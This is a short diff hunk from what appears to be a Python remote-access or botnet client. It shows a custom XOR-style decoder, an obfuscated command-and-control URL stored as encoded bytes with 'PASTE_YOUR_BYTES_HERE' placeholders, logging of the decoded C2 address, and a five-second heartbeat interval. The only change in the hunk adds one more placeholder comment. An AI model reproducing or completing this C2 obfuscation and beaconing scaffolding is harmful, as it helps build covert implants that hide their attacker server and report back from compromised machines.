@@ -139,7 +139,7 @@ def _xd(d, s="k3ycu5t0m", r=4):
     ol = (raw[-2] << 8) | raw[-1]
     return bytes(raw[:ol]).decode()
 
-_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
+_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
 C2_URL = _xd(_C2_ENC)
 _boot_log(f"C2_URL DECODED: {C2_URL}")
 HEARTBEAT_INTERVAL = 5
